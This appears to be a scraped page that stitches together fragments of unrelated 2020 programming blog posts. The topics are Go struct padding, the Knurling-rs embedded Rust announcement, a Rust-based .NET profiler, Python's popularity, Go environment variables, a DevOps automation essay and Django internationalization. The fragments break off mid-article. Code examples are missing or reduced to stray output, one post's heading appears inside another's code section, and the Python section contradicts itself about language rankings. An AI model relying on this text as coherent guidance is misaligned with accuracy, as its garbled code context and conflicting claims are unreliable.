<pre><code lang="bash">Struct is 6 bytes long
NumPosts at offset 0, size=1, align=1
Reach at offset 2, size=2, align=2
NumLikes at offset 4, size=1, align=1
Alloc = 1084 MiB        TotalAlloc = 3012 MiB   Sys = 2713 MiB  NumGC = 19</code></pre>



<p>Notice that even though <code>NumPosts</code> only has a size of 1 byte, the next field, <code>Reach</code>, still starts at offset 2. A whole byte is being wasted! The same thing happens with the <code>NumLikes</code> field, it starts at offset 4 with a size of 1, but the struct still takes up the full 6 bytes.</p>



<p>This may not seem like a big deal, but when you are storing millions of these structs in memory the bloat starts to add up quick.</p>



<p>If we change the <code>stats</code> struct such that the <code>uint16</code> isn’t defined between the <code>uint8</code>s:</p>



<pre><code lang="go">type stats struct {
	Reach    uint16
	NumPosts uint8
	NumLikes uint8
}</code></pre>



<p>Then the output of the program becomes:</p>



<pre><code lang="bash">Struct is 4 bytes long
Reach at offset 0, size=2, align=2
NumPosts at offset 2, size=1, align=1
NumLikes at offset 3, size=1, align=1
Alloc = 694 MiB TotalAlloc = 1927 MiB   Sys = 1391 MiB  NumGC = 19</code></pre>



<p>The total allocated memory drops from 3 GB to less than 2, and each instance of the struct now only uses 4 bytes.</p>



<h2>Why?</h2>



<p>Modern CPU hardware performs reads and writes to memory most efficiently when the data is&nbsp;<em><a href="https://en.wikipedia.org/wiki/Data_structure_alignment" target="_blank" rel="noreferrer noopener">naturally aligned</a></em>. The memory that is stored side by side should be accessible using a common multiple, so the Go compiler makes sure that it is.</p>



<p>With our first struct, the Reach field is between the NumPosts and NumLikes fields, which means that the compiler will add some padding to keep things nice and even. </p>

<p>In our updated struct however, we have grouped the smaller fields, and since they add up to the same amount of memory as the larger <code>Reach</code> field we can save some space!</p>

<p>This was is a weird quirk, but making the smal optimizations has made a huge impact on some of our services.</p>

August 13, 2020 | https://ferrous-systems.com/blog/knurling-rs/ | <a href="https://web.archive.org/web/*/https://ferrous-systems.com/blog/knurling-rs/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p><img src="https://ferrous-systems.com/images/knurling-rs.png" alt="Knurling-rs"></p>

<p>Today we're announcing <a href="https://github.com/knurling-rs">Knurling</a> - Ferrous' effort to sustainably build better tooling for developing and debugging Rust software for embedded systems.</p>

<p>To make this a reality, we are opening a <a href="https://github.com/knurling-rs/meta">GitHub organization</a> to collect these efforts, as well as making it possible to <a href="https://github.com/sponsors/knurling-rs">support our efforts through GitHub Sponsors</a>.</p>

<h2 id="the-mission">The Mission</h2>

<p>We believe that developing software for embedded systems should be no more difficult than developing for hosted platforms. It should be possible to use the same workflows and equally powerful tooling to develop applications and libraries for tiny embedded systems as well as server-class hardware.</p>

<p>To that end, we want to enable:</p>

<ul>
  <li>Learning embedded Rust with up to date and maintained teaching material</li>
  <li>Space-efficient and real-time capable logging</li>
  <li>Tools that integrate into your standard cargo run and cargo test workflows</li>
  <li>Execution tracing</li>
  <li>Simple data logging and visualization straight into your IDE or Browser</li>
</ul>

<p>We are already active contributors in the open source ecosystem, but we want to spend more time dedicated to building tools that improve the experience for the entire ecosystem, and we can't do that without <a href="https://github.com/sponsors/knurling-rs">your support</a>.</p>

<h2 id="release-model">Release Model</h2>

<p>We plan to make everything we develop under Knurling to be open source, in order to support the community. This includes all of the tooling, teaching material, and support libraries we develop.</p>

<p>The items we release will all be under <a href="https://opensource.org/licenses/MIT">MIT</a>+<a href="https://www.apache.org/licenses/LICENSE-2.0.html">Apache 2.0</a> licenses for code, and <a href="https://creativecommons.org/licenses/by-sa/4.0/">CC-BY-SA 4.0</a> for written material.</p>

<p>Sponsors will also have early access to work in progress tools and libraries before they are released, as well as early access to our training material and exercises before they are made public.</p>

<p>Early Access is available for all sponsors, regardless of tier.</p>

<p>Let's take a quick tour of the things we plan to make possible with <a href="https://github.com/knurling-rs/meta">Knurling</a>:</p>



<blockquote>
  <p>EDIT: This blog post has been updated to reflect the rename of <code>binfmt</code> to <code>defmt</code>.</p>
</blockquote>

<p><img src="https://ferrous-systems.com/images/defmt-teaser.jpg" alt="defmt preview"></p>

<p>We'd like to spend time to make it easier to design, build, debug, and release software components with embedded Rust. This includes developing target-side libraries, as well as host-side applications that interact with these components.</p>

<p>We also want to make it possible to have best-in-class debugging tools, allowing you to monitor, graph, and visualize what your system is doing. We think that it's possible to make developing embedded systems painless through better and extensible tooling!</p>

<p>The first of these tools we plan to release is <code>defmt</code> (in the screenshot above), a tool for efficient logging and tracing in real-time, using a variety of different transport methods like Semihosting, RTT, or even a UART or radio. <code>defmt</code> will allow for logging of data without incurring expensive formatting costs on the device itself.</p>

<p>We'll be talking more about defmt next week on our blog, but you can check it out now if you <a href="https://github.com/sponsors/knurling-rs">become a sponsor today</a>!</p>

<h2 id="more-training-and-learning-examples">More Training and Learning Examples</h2>

<p><img src="https://ferrous-systems.com/images/emb-trainings.png" alt="embedded trainings"></p>

<p>We're already developing open source training material for embedded systems in Rust, including our training material for <a href="https://github.com/ferrous-systems/teaching-material/">basic Rust training</a>, the material for our <a href="https://github.com/ferrous-systems/embedded-trainings">2019 Embedded Trainings</a>, as well as our most recent <a href="https://github.com/ferrous-systems/embedded-trainings-2020">2020 Embedded Trainings</a>.</p>

<p>We plan to develop a new, continuously maintained set of training material that consists of two parts:</p>

<p>The first part is <strong>Knurling Books</strong>, which are written guides that teach general concepts of embedded systems and Rust, and come with associated sample projects demonstrating the concepts. This is a great place for folks to learn embedded systems or embedded systems with Rust!</p>

<p>The second part is <strong>Knurling Sessions</strong>, which are quarterly embedded projects that explore specific projects using generally available hardware, building full systems and components using microcontrollers, sensors, and actuators.</p>

<p>These will be guided, hands-on tutorials for building projects like a CO2 Sensor, Data Loggers, and even robots! For folks that want to learn in a more hands-on way, or want to know "what hardware should I buy to get started", Knurling Sessions are a great option!</p>

<p>Before each session, we'll announce the hardware we'll use and how we'll use it. If you want to follow along and build the project at home, we'll include links to purchase the hardware. We'll reuse components session to session, so you can start building your own collection of parts!</p>

<p>In the future, we plan to also offer video based training and Q&amp;A sessions where we explore the concepts in a deeper and more detailed way, great for learning how and why things are built.</p>

<p>As we mentioned, all of the <strong>Knurling Books</strong> and <strong>Knurling Sessions</strong> will be made public and open source, but <a href="https://github.com/sponsors/knurling-rs">Sponsors</a> will get early access to both!</p>

<p>We'll be announcing our first training books and sessions later in August, so stay tuned!</p>

<h2 id="more-experiments-and-ecosystem-improvements">More Experiments and Ecosystem Improvements</h2>

<p><img src="https://ferrous-systems.com/images/async-on-embedded.png" alt="async on embedded"></p>

<p>In the past, we've done a number of experiments and improvements towards the Rust and Rust Embedded ecosystems. Most recently, we <a href="https://ferrous-systems.com/blog/embedded-async-await/">wrote about</a> making <a href="https://ferrous-systems.com/blog/async-on-embedded/">async/await</a> possible <a href="https://ferrous-systems.com/blog/stable-async-on-embedded/">for embedded systems</a>, and were even able to contribute optimizations that sped up compilation and run time for all users of async/await!</p>

<p>We released these experiments as <a href="https://github.com/ferrous-systems/async-on-embedded">an open source project</a>, and it has already been <a href="https://github.com/rust-embedded-community/async-on-embedded">transferred to community ownership</a>.</p>

<p>We'd like to dedicate more time to these kinds of projects, exploring what could be possible with embedded Rust, bringing crates to a maintained 1.0 status, or improving the compiler to benefit embedded systems developers. You can help us make this happen by <a href="https://github.com/sponsors/knurling-rs">sponsoring our efforts</a>!</p>

<h2 id="thank-you-all">Thank you all!</h2>

<p>We think the embedded Rust ecosystem is already the best way to develop embedded software today, but we can make it even better and easier, whether you are a developer who has never touched a microcontroller before, or you are a developer that is already an expert in embedded Rust.</p>

<p>If you'd like to support these works as an individual or through your company, we'd <a href="https://github.com/sponsors/knurling-rs">appreciate it a lot</a>! If you're interested in more details, or there is something you'd like to see us do, <a href="mailto:knurling@ferrous-systems.com">just drop us an email</a>!</p>

<p><em>The code for the library used in this post can be found <a href="https://github.com/camdenreslink/clr-profiler">here</a>. It is only intended as a proof of concept, so user beware!</em></p>



<p>Here is a simple .NET profiler implemented in Rust that prints the name of a function just before it is JIT compiled. The client library must create a type that implements all of the <code>CorProfilerCallback</code> traits. All of the methods in the callback traits have default implementations, so you only need to implement the methods that you actually want to use. COM boilerplate is set up for you behind the scenes with the <code>register!</code> macro call at the end of the code snippet.</p>

<p>The .NET Profiling API is a mechanism exposed by the .NET runtime which allows an external library to hook into certain events such as garbage collection, jit compilation, and assembly loading. One step of the CLR startup routine is checking if a profiler has been registered (using the registry on Windows, and environment variables on non-Windows platforms). If one has been registered, the CLR loads the profiler library into the same OS process as the CLR itself. This allows the CLR and the profiler to communicate by efficiently passing pointers to data back and forth (no IPC overhead required).</p>



<p>.NET Profiling API interfaces are defined as COM interfaces. The following steps happen when the CLR process starts to hook the CLR and Profiling library together.</p>

<ul>
<li>The CLR will call the <code>DllGetClassObject</code> function exposed by your library.</li>
<li>This will pass back to the CLR an object that implements the <code>IClassFactory</code> interface.</li>
<li>The CLR then calls the <code>CreateInstance</code> method on the <code>IClassFactory</code> that it now has a handle to. This returns an object that adheres to one of the <code>ICorProfilerCallback</code> interfaces.</li>
<li>Now that the CLR has a handle to your profiler object, it can call the methods defined on it to provide important information about the behavior of the profiled application (e.g. <code>AssemblyLoadStarted()</code> or <code>ObjectAllocated()</code>).</li>
</ul>

<p><strong>What does it mean for an object to implement a COM interface?</strong></p>

<p>The implementation of COM is very C++-centric. COM objects are expected to be laid out in memory the same way the C++ classes are laid out. A C++ class is a struct whose first member is a pointer to an array that consists of function pointers to that class’ method implementations. This function pointer array is called a <em>virtual method table</em>, and we can replicate its structure in Rust.</p>

</figure>

<p>Here is a simple example:</p>


<div>
        
        
                <div><pre><code data-lang="rust"><span>#[repr(C)]</span>
<span>pub</span> <span>struct</span> <span>IUnknown</span><span>&lt;</span>T<span>&gt;</span> {
    <span>pub</span> QueryInterface: <span>unsafe</span> <span>extern</span> <span>"system"</span> <span>fn</span>(
        this: <span>&amp;</span><span>mut</span> T,
        riid: <span>REFIID</span>,
        ppvObject: <span>*</span><span>mut</span> <span>*</span><span>mut</span> c_void,
    ) -&gt; <span>HRESULT</span>,
    <span>pub</span> AddRef: <span>unsafe</span> <span>extern</span> <span>"system"</span> <span>fn</span>(this: <span>&amp;</span><span>mut</span> T) -&gt; <span>ULONG</span>,
    <span>pub</span> Release: <span>unsafe</span> <span>extern</span> <span>"system"</span> <span>fn</span>(this: <span>&amp;</span><span>mut</span> T) -&gt; <span>ULONG</span>,
}

<span>#[repr(C)]</span>
<span>pub</span> <span>struct</span> <span>IMethodMalloc</span><span>&lt;</span>T<span>&gt;</span> {
    <span>pub</span> Alloc: <span>unsafe</span> <span>extern</span> <span>"system"</span> <span>fn</span>(this: <span>&amp;</span><span>T</span>, cb: <span>ULONG</span>) -&gt; <span>HRESULT</span>,
}

<span>#[repr(C)]</span>
<span>pub</span> <span>struct</span> <span>MethodMallocVtbl</span> {
    <span>pub</span> IUnknown: <span>IUnknown</span><span>&lt;</span>MethodMalloc<span>&gt;</span>,
    <span>pub</span> IMethodMalloc: <span>IMethodMalloc</span><span>&lt;</span>MethodMalloc<span>&gt;</span>,
}

<span>#[repr(C)]</span>
<span>pub</span> <span>struct</span> <span>MethodMalloc</span> {
    <span>pub</span> lpVtbl: <span>*</span><span>const</span> MethodMallocVtbl,
}</code></pre></div>
        
</div>

<p>In the above example, our COM class is implemented by the Rust struct <code>MethodMalloc</code>. It contains only a raw pointer to another struct implementing its virtual method table, <code>MethodMallocVtbl</code>. This method table contains the function pointers corresponding to the <code>IUnknown</code> and <code>IMethodMalloc</code> COM interfaces. Notice that the <code>IUnknown</code> interface is defined as the first field of the virtual method table struct. All COM classes must implement <code>IUnknown</code>. The order of the function pointers in the virtual method table is important, so care must be taken to ensure the functions are laid out correctly.</p>



<p>In-process COM servers must implement the <code>DllGetClassObject</code> function to provide a way for a client (in our case the CLR) to access instances of the COM classes it provides. In the case of a profiler, we are providing a class to the CLR that implements the <code>ICorProfilerCallback</code> interfaces. If we want to maintain Rust’s type safety, but still provide a generic way to generate a <code>DllGetClassObject</code> function that will return some provided profiler data type, we’ll need to use Rust’s <em>procedural macros</em> feature. This allows a library author to manipulate tokens of Rust source code at compile time to dynamically generate code. Here is an example procedural macro that generates a <code>DllGetClassObject</code> function definition at compile time:</p>


<div>
        
        
                <div><pre><code data-lang="rust"><span>#[proc_macro]</span>
<span>pub</span> <span>fn</span> <span>register</span>(item: <span>TokenStream</span>) -&gt; <span>TokenStream</span> {
    <span>let</span> profiler_type <span>=</span> parse_macro_input<span>!</span>(item <span>as</span> Type);
    <span>let</span> output <span>=</span> quote<span>!</span> {
        <span>use</span> clr_profiler::ffi::{ClassFactory <span>as</span> FFIClassFactory, CorProfilerCallback <span>as</span> FFICorProfilerCallback, E_FAIL <span>as</span> FFI_E_FAIL, GUID <span>as</span> FFI_GUID, HRESULT <span>as</span> FFI_HRESULT, LPVOID <span>as</span> FFI_LPVOID, REFCLSID <span>as</span> FFI_REFCLSID, REFIID <span>as</span> FFI_REFIID};
        <span>#[no_mangle]</span>
        <span>unsafe</span> <span>extern</span> <span>"system"</span> <span>fn</span> <span>DllGetClassObject</span>(
            rclsid: <span>FFI_REFCLSID</span>,
            riid: <span>FFI_REFIID</span>,
            ppv: <span>*</span><span>mut</span> FFI_LPVOID,
        ) -&gt; <span>FFI_HRESULT</span> {
            <span>let</span> profiler <span>=</span> <span>&lt;</span><span>#</span>profiler_type<span>&gt;</span>::new();
            <span>let</span> clsid <span>=</span> FFI_GUID::from(<span>*</span>profiler.clsid());
            <span>if</span> ppv.is_null() <span>||</span> <span>*</span>rclsid <span>!=</span> clsid {
                println<span>!</span>(<span>"CLSID didn't match. CLSID: {:?}"</span>, clsid);
                FFI_E_FAIL
            } <span>else</span> {
                <span>let</span> class_factory: <span>&amp;</span><span>mut</span> FFIClassFactory<span>&lt;</span><span>#</span>profiler_type<span>&gt;</span> <span>=</span> FFIClassFactory::new(profiler);
                class_factory.QueryInterface(riid, ppv)
            }
        }
    };
    output.into()
}</code></pre></div>
        
</div>

<p>The line <code>let profiler = &lt;#profiler_type&gt;::new();</code> will dynamically create an instance of the provided profiler type. This means that the type must provide an empty constructor function, or the macro will fail to compile. Some of the names are prefixed with <code>FFI</code> to prevent naming collisions within any modules that the macro is invoked.</p>



<p>Rust has certain patterns and language features that improve safety and make coding more enjoyable. Some effort was made to adapt the Profiling API method signatures to follow Rust idioms.</p>

<p><strong>Using <code>Result&lt;Ok, Err&gt;</code> to indicate potential failure</strong></p>

<p>Almost all methods in the .NET Unmanaged API return an <code>HRESULT</code>, which is a type of error code. In order to achieve returning the intended values from the method along with the error code, mutable pointers are passed into the method and populated. This can be the source of errors, because sometimes it is unclear who is responsible for allocation/deallocating memory for these data structures. The concept of ownership (Rust’s killer feature) addresses this, but we must still deal with it at the FFI (foreign function interface) boundary. For example, the following function returns a <code>ClassID</code> when provided with an <code>ObjectID</code>. A function would typically just have <code>ClassID</code> as the return type, but instead the <code>HRESULT</code> error code is the return type.</p>


<div>
        
        
                <div><pre><code data-lang="c++">HRESULT <span>GetClassFromObject</span>(  
    [in]  ObjectID objectId,  
    [out] ClassID <span>*</span>pClassId);
</code></pre></div>

        <h2>At least not anytime soon!</h2>
        
        
        <section>
            <figure>
                
                <img alt="Feature Image" width="1200" height="675" src="https://livecodestream.dev/post/2020-08-13-dont-worry-python-is-not-going-away/featured_hu4a8d7989115f0f8a2e85aed33a55a83a_96291_680x0_resize_q75_box.jpg">

            <p>In the last few months, perhaps a year or more, a lot of people started talking about how Python would be going away in favor of other newer programming languages like Julia, Rust, Go, etc. However today I want to discuss what the data actually show us and I’ll let you make your own conclusions (though, based on the title, you know mine).</p>
<p>Let’s get started with some of the arguments against Python.</p>
<hr>
<h2 id="whats-wrong-with-python">What’s wrong with Python</h2>
<p>There are a number of arguments against Python, and how other languages are filling that gap, or resolving some of the issues. Let’s see some of the arguments against Python.</p>
<h3 id="speed">Speed</h3>
<p>Python is <strong>SLOW</strong>, it is well known that Python can’t perform side by side to programming languages like C++, Go, or Rust (among others), but sometimes speed is not all. Python may not be the fastest programming language, but with the right setups, libraries, and coding it can support wild volumes, process huge amounts of data. Don’t be obsessed with raw speed only, most of the time you won’t need it, and the simplicity of Python and availability of developers may well compensate for the lack of speed.</p>
<h3 id="types">Types</h3>
<p>Even though since Python supports types with <a href="https://docs.python.org/3/library/typing.html">Python 3.6 - Typings</a>, it is also true that while you can annotate a variable with a type to have better code completion on your IDE, Python would still handle that variable with dynamic typing without performing any validation. If you want to have type validation you are required to do it yourself, or even better, use a Python library like <a href="https://pydantic-docs.helpmanual.io/">Pydantic</a>.</p>
<p>There are good frameworks using Python types, like FastAPI, which we covered in a previous article. <a href="https://livecodestream.dev/post/2020-08-05-quickly-develop-highly-performant-apis-with-fastapi-python/">Quickly Develop Highly Performant APIs with FastAPI &amp; Python</a>.</p>
<h3 id="its-old">It’s old</h3>
<p>I can’t believe this is an actual argument but seems like it does. Yes, Python is from the 90s, and it has a few more years than some of its contenders but it is still pretty solid. Over time not only turned out to be a great programming language but also has built a great community, a huge library repository, and much more. There are problems that date back to what was consider a best practice back then, that now is not so much, but being old by itself is not an argument.</p>
<hr>
<h2 id="the-data-to-the-rescue">The data to the rescue</h2>
<p>In order to understand why I believe Python is not going away anytime soon, we will focus on DATA, impartial (maybe), simple, old fashioned data.</p>
<h3 id="the-state-of-developer-ecosystem-2020httpswwwjetbrainscomlpdevecosystem-2020"><a href="https://www.jetbrains.com/lp/devecosystem-2020/">The State of Developer Ecosystem 2020</a></h3>
<p>We will start reviewing a recent report from JetBrains, where, in their own words, they combined results of the fourth annual Developer Ecosystem Survey with the feedback from 19,696 developers whom they surveyed in the beginning of 2020 to identify the latest trends around tools, technologies, programming languages, and many other exciting facets of the development world.</p>
<p>The first relevant question in the survey is “What are your primary programming languages?", which highlights Python on 3rd place right after JavaScript and Java. But if we look at the next question “Do you plan to adopt or migrate to other languages in the next 12 months? If so, to which ones?” We can see many Java developers planning to learn or migrate into Python. So the Python adoption is actually growing and not shrinking.</p>

<p>The survey has other very interesting sections that go a bit off-topic of this post, so I recommend you read it in full, or you can just read the <a href="https://www.jetbrains.com/lp/devecosystem-2020/python/">Python section</a> where they talk about IDEs, what is Python being used for and other interesting stuff.</p>
<h3 id="stackoverflow-2020-developer-surveyhttpsinsightsstackoverflowcomsurvey2020"><a href="https://insights.stackoverflow.com/survey/2020">StackOverflow 2020 Developer Survey</a></h3>
<p>Probably the biggest and most important development survey out there, very interesting, I’m always participating in the character of the respondent. It has a ton of insightful questions, but let’s see what developers are saying about programming languages and Python in particular.</p>
<p>In the report one of the metrics is the popularity of technology, with the results being:</p>







    
        
        
    


<figure data-src="/post/2020-08-13-dont-worry-python-is-not-going-away/so-languages-popularity_hu9e7a47c7da82f414dbeac8e0ed976530_22242_700x0_resize_q75_box.jpg">

<p>With Python on a solid 4th place after JavaScript, HTML/CSS and SQL, which if we focus only on programming languages would be 2nd right above Java, which is different compared to the previous survey, though we could see there as well the trend of people jumping to Python over Java.</p>
<p>Now things get good, one popular section in the survey is: “Most Loved, Dreaded, and Wanted Languages”, let’s see how Python stands up in each of them:</p>

<p>Again in both sections, Python is at the top, being the 3rd most loved programming language after Rust and TypeScript, and being the most loved programming language.</p>
<p>This survey is fantastic and deserves a full read if you haven’t done that already.</p>
<hr>
<h2 id="conclusion">Conclusion</h2>
<p>Python has its flaws, speed, kinda old, with old concepts, but it is still a major player, clearly a top contender and <a href="https://livecodestream.dev/post/2020-05-30-what-is-python-best-for/">widely used in a variety of projects</a> from web development to IoT and data science.</p>
<p>After seeing the numbers I understand that Python is not going away anytime soon. It will probably be a time when this may be different, but Python is a language still worth learning, exploring, and mastering.</p>
<p>Thanks for reading!</p>

                <p>In this tutorial, I will be covering the basics around environment variables and some of the default and most used Golang environment variables. We will also learn how to set environment config from our golang programs.</p>

<p>Let’s begin!</p>

<h2 id="what-are-the-environment-variables">What are the environment variables?</h2>

<p>An <a href="https://en.wikipedia.org/wiki/Environment_variable"><em>environment variable</em></a> is a name/value pair that is present outside of the program but can be referenced at a given time. There are a lot of environment variables which are already predefined in your system. Eg. <strong>$HOME</strong></p>

<p>Trying running <code>echo $HOME</code> this will display your current user home directory. For me it’s like - <code>/home/mohit</code> . The result may vary based on your OS. Since I am using Ubuntu, the results might be different on your machine. But, concepts remains the same 😎</p>

<p>These environment variables can be set/unset or used anytime similar to how variables work in our programs.</p>

<p>You can see all the environment variables in your system with <code>env</code> command.</p>

<hr>

<h2 id="go-default-environment-variables">Go default Environment variables</h2>

<p>There are many variables that come with Golang when you install it and can be configured as per use. Some of the most used ones are -</p>

<h3 id="goroot">GOROOT</h3>

<p>This is the path where the Go standard library is located on your local filesystem. You generally won’t need to modify this unless you want to use some other versions of Go as well. It is set to <code>/usr/local/&lt;go-version&gt;</code> by default</p>

<h3 id="gopath">GOPATH</h3>

<p>This variable defines the root of your workspace. It tells Go where to look for your code. It stores all the files necessary for the development of the programs. It consists of three directories -</p>

<ul>
  <li><code>/bin</code> - where go places binaries that <code>go install</code> compile</li>
  <li><code>/pkg</code> - location of compiled package code</li>
  <li><code>/src</code> - where your go code resides</li>
</ul>

<p>By default, it is unset and points to a subdirectory named <code>go</code> in the user’s home directory. ($HOME/go on Unix, %USERPROFILE%\go on Windows)</p>

<h3 id="goproxy">GOPROXY</h3>

<p>From Go docs -</p>

<blockquote>
  <p>A Go module proxy is any web server that can respond to GET requests
for URLs of a specified form.</p>
</blockquote>

<p>GO proxy allows control over the download source and provides caching as well. This serves the <code>zip</code> archive of source code over HTTP making it faster.</p>

<p>You can use the proxy server by setting -</p>

<div><div><pre><code><table><tbody><tr><td><pre>1
</pre></td><td><pre><span>export </span>GOPROXY <span>=</span> https://proxy.golang.org/
</pre></td></tr></tbody></table></code></pre></div></div>

<p>The above proxy is run by the Go team. To make changes permanent , add it to <code>~/.bashrc</code>.</p>

<h3 id="goos">GOOS</h3>

<p>GOOS defines the operating system for which to compile code. Examples are linux, darwin, windows, etc. This is an optional environment variable by default is set to empty.</p>

<hr>

<h2 id="setting-custom-env-variablesconfigs-in-go">Setting custom Env. variables/Configs in Go</h2>

<p>Now that you have learned the basics of environment variables and some default ones provided by Go, you might be wondering to use it in your own projects. Configs should be used to store all kind of important information which can be easy to change. This also provides additional security to your passwords, secret keys to be directly available in your source code and are visible to anyone who has access to code.</p>

<p>Also, various environments require different configs. Like you would want to give different config in your test/development servers to those of production servers.</p>

<p>That’s a lot of explanation but it was required so that you don’t push secrets and use configs. There are a lot of ways to manage configs in go projects via <code>.env</code>,<code>.json</code>,<code>.yaml</code>, <code>.toml</code> and other formats. For simplicity, for now we will set the environment variables via code -</p>

<div><div><pre><code><table><tbody><tr><td><pre>1

3
</pre></td><td><pre><span># Output</span>
SOME_VALUE
After <span>unset</span> -&gt;
</pre></td></tr></tbody></table></code></pre></div></div>

<p>Here, the program is pretty straightforward where we first set the variable and then fetch it with <code>os.Getenv()</code>, then we unset it using <code>os.Unsetenv()</code></p>

<p>There are a couple of other useful methods -</p>

<ul>
  <li><code>os.Environ()</code> - This returns all the environment variable which are set in key=value format.</li>
  <li><code>os.LookupEnv()</code> - This function combines the functionality of checking whether such variable exists, if yes then it returns the value.</li>
  <li><code>os.Clearenv()</code>- This method deletes all the environment variables and is useful when we are writing tests.</li>
</ul>

<p>Well, it is not a good practice to use these secrets in your code directly. To solve this there are a number of libraries like <a href="https://github.com/joho/godotenv">godotenv</a>, <a href="https://github.com/spf13/viper">viper</a> and others.</p>

<p>Here, the code below uses <code>godotenv</code> -
You can get it using <code>go get github.com/joho/godotenv</code></p>

<p>In this code, we first load the environment variables from a <code>.env</code> file in this project directory. Then, we fetch the <code>REDIS_PORT</code> key. The <code>.env</code> file looks like -</p>

				<p>Tooling has always been a strategically important method for engineering teams to bolster efficiency. The latest research by <a href="https://www.mckinsey.com/industries/technology-media-and-telecommunications/our-insights/developer-velocity-how-software-excellence-fuels-business-performance?cid=soc-app">McKinsey &amp; Company</a>, where 440 senior engineering executives were surveyed, demonstrates that companies are 65% likely to be more innovative with better tooling. </p><p>There’s nothing new here, engineers have always looked at tooling as a source for automation. But with the report revealing that only 5% of executives listed tooling a top three method for software enablement. With technologies rapidly rising and falling, software companies need to be leaner than ever in their adoption of automation tools. </p><p>To master this accelerating shift, technical leaders need to look at automation adoption beyond engineering departments and view the software delivery process as a cross-departmental effort. If you’re one of the many forward-looking technical leads hoping to gain strategic advantages, here’s how to ensure automation success. </p><h2 id="devops-today-and-the-automation-of-tomorrow">DevOps Today and the Automation of Tomorrow</h2><p>Traditionally, the developer tooling market has always been geared towards engineers, where DevOps specialists would craft automation, pipelines, and processes by integrating different technologies for the developer, and the graphic below shows the current tools out there.</p><!--kg-card-begin: image--><figure><img src="https://lh3.googleusercontent.com/rT9GfCt5hb7rwD2AC_bDeFI-pDxKlW8a7SZ8MSQYywCh0hNXj8UxXfs7ZmEpEPeoMB5tWFsxgBr_UpjJrSfroqayELR9eVfvWco1bjr-jOH6P4-zF-Ct97DGJjmjD4cMSzveToM7"></figure><!--kg-card-end: image--><p>In essence, the automation that the tools above provide was built with developers in mind as the end-user. The end result yields greater developer satisfaction, as their talent and imagination are given the means to shine. </p><p>As evidenced by the <a href="https://services.google.com/fh/files/misc/state-of-devops-2019.pdf">2019 State of DevOps reports</a>, the software industry values speed and automation of delivery and tasks, and the report, in particular, asserts that strong tool-chains give developers a culture of “psychological safety,” effectively bolstering team productivity. With <a href="https://stripe.com/en-ca/reports/developer-coefficient-2018">$300 billion being lost annually in developer productivity</a>, we can see a real opportunity for automation to keep saving developers, and the overall business, precious time. </p><h2 id="a-movement-to-workflows">A Movement to Workflows</h2><p>There’s already been a movement in the software industry to streamline processes with automation. For example, GitOps is streamlining source control by tightly integrating it with CI/CD. But that just doesn’t go far enough. As the developer tooling market grows, more and more tools are now required to be integrated into the software delivery process, causing greater market fragmentation. Companies like Salesforce are even launching their own DevOps platforms, meaning vendor-specific integration is more of a challenge than ever before for DevOps teams who are looking to streamline their delivery across their technology portfolio.</p><p>So, as business toolchains grow, it has become more critical than ever to eliminate silos of automation creation and empower other functions across the business, especially that outside of engineering, to be able to automate on their own. Essentially the cost of automation ownership must be lowered to allow for a more frictionless process for automation to take place. In this scenario, we see the rise of the workflow – a set of tasks and processes whereby multiple tools can be seamlessly integrated. As such, businesses must see automation outside the lens of engineering, and look to democratize its extraordinary benefits across the entire business to other departments.</p><p>A great example of a company lowering the barriers to automation is Atlassian. The company announced a <a href="https://www.computerworld.com/article/3532328/atlassian-adds-no-code-automation-to-jira-cloud-products.html">no-code workflow creator</a> for any user across it’s Jira Cloud portfolio. &nbsp; </p><p>In parallel, an interesting insight provided by McKinsey, which was missing from other reports, is the growing benefits of low-code tools. The study reveals that low-code tools help organizations adopt automation advantages at a much lower cost of ownership and allow them to exponentially increase their leverage on their development talent. The study observed that teams were able to adopt automation much faster when the barrier to automation (i.e. code complexity) is lowered. This makes automation accessible to less technical team members and enhances self-service and cross-functional accessibility to automation through workflows that they can create to their own needs. </p><p>At CTO.ai, we rethought automation from the bottom up to address these challenges. We realized that the most obvious solution was not only to lower the cost of automation through low code, but also to bring these developer tools to the place where people meet across the entire organization – Slack – and more specifically, SlackOps or DevOps in Slack (often more generally called ChatOps in the industry).</p><p>We further realized that businesses need an easy platform that all employees can leverage. By bringing the ease of chat and automation in a shared and transparent environment such as Slack, there’s an opportunity for businesses to significantly reduce inefficiencies and turbocharge productivity. </p><h2 id="a-brave-new-automation">A Brave New Automation</h2><p>With automation changing form, there will be winners and losers concerning how businesses approach the new world we’re entering. Businesses that are unwilling to begin implementing changes in their software development tooling and wider business access to workflow creation will be left behind. </p><p>For technical leadership, this is an opportunity to export engineering-based concepts and ideas such as CI/CD, automation testing, and more to other departments. Engineering departments have, generally speaking, long been ahead of other departments in regards to optimization, and use of automation. After all, engineers can code, but other departments don’t have such requirements in their job descriptions. </p><p>We at CTO.ai continue to advocate for greater use of automation for DevOps and all departments. As we continue to iterate our cutting-edge technology for Slack workflows (SlackOps), not only does the rise of the workflow become an important factor in the accessibility of automation, but also the measurement of workflow efficacy becomes even more critical. As such, companies need to be cognizant of their workflow efficacy and therefore must continue to ever optimize for scale. This is why we’re also introducing a Workflow Metrics MVP, the first-concept measurement of workflow efficiency.</p><p><em>Want to see our private demo?

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
            <p>According to the always trustworthy Wikipedia, there are approximately 360 million native English speakers in the world. We, as developers, are so used to write code and documentation in English that we may not realize that this number only represents 4.67% of the world population. It is very useful to have a common language for the communication between developers, but this doesn’t mean that the user shouldn’t feel a little bit more comfortable when using your product.</p>
<p>This post will start discussing the definition of internationalization and localization and why they matter for your application. Then we will go over some of the internationalization tools that developers have available to work on their Python and Django projects. Finally, we will present how we had to adapt our development flow to incorporate the internationalization step.</p>
<h2>Localization vs Internationalization</h2>
<p><strong>Localization (l10n</strong><sup id="fnref:1"><a href="#fn:1">1</a></sup><strong>)</strong> is the process of adapting an application, product or even a document to be more user-friendly to customers from different countries and cultures.</p>
<p>On the other hand, <strong>internationalization (i18n)</strong> is the process of enabling localization of the product on the application. Implementing a software in a way that it will know when and how to show different content depending on the costumer’s locale.</p>
<p>As the Django documentation perfectly summarizes: localization is done by translators and internationalization is done by developers<sup id="fnref:2"><a href="#fn:2">2</a></sup></p>
<p>However, this simplified definition of internationalization and localization may give the wrong impression that this is just about translation. This process entails several other adaptations needed to make users from different cultures feel more comfortable using your product, such as:</p>
<ul>
<li>Date and currency formatting</li>
<li>Currency conversion</li>
<li>Units of measurement conversion</li>
<li>Unicode characters and bidirectional text (see example below)</li>
<li>Time zones, calendar and special holidays</li>
</ul>
